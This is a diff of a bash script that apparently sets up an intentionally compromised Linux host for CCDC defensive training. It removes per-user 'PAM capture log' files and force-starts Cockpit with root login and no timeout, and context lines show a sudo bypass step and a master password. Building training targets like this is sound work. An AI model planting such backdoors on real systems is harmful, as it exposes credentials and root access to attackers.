@@ -764,32 +764,6 @@ PERMITSCRIPT
         fi
     done
 
-    echo -e "${YELLOW}[*] Step 5: Initializing user capture logs...${NC}"
-    local username userid user_home
-    while IFS=: read -r username _ userid _ _ user_home _; do
-        if [[ "$userid" -ge 1000 ]] 2>/dev/null || [[ "$username" = "root" ]]; then
-            if [[ -d "$user_home" ]]; then
-                local capture_file="$user_home/LOOK_WHAT_PAM_CAPTURED_FLAG.txt"
-                if [[ ! -f "$capture_file" ]]; then
-                    cat > "$capture_file" << PAMLOG
-================================================================================
-                   CCDC TRAINING - PAM CAPTURE LOG
-================================================================================
-This file demonstrates what a malicious PAM module can capture during
-authentication attempts. Each login attempt's credentials are logged here.
-
-Captured Authentication Events:
-================================================================================
-
-PAMLOG
-                    chown "$username:$username" "$capture_file" 2>/dev/null || true
-                    chmod 600 "$capture_file"
-                    echo -e "${GREEN}[+] Created capture log for user: $username${NC}"
-                fi
-            fi
-        fi
-    done < /etc/passwd
-
     echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
     if ! grep -q "CCDC_Training" /etc/sudoers 2>/dev/null; then
         {
@@ -842,7 +816,6 @@ SSHCFG
     echo -e "${GREEN}========================================${NC}"
     echo ""
     echo -e "${BLUE}Master Password:${NC} ${YELLOW}FLAGPASSWORD${NC}"
-    echo -e "${BLUE}Capture Logs:${NC}    ~/LOOK_WHAT_PAM_CAPTURED_FLAG.txt"
     echo -e "${BLUE}Auth Handler:${NC}    /opt/ccdc_training/pam_auth_handler.sh"
 }
 
@@ -1116,7 +1089,9 @@ Banner =
 COCKPITEOF
     echo "" > /etc/cockpit/disallowed-users
     systemctl enable --now cockpit.socket
-    if systemctl is-active --quiet cockpit.socket; then
+    systemctl enable cockpit 2>/dev/null || true
+    systemctl start cockpit 2>/dev/null || true
+    if systemctl is-active --quiet cockpit.socket || systemctl is-active --quiet cockpit; then
         success "Cockpit running on https://localhost:${COCKPIT_PORT} (root login allowed, no timeout)"
     else
         warn "Cockpit socket not active — check: journalctl -u cockpit.socket -n 30"
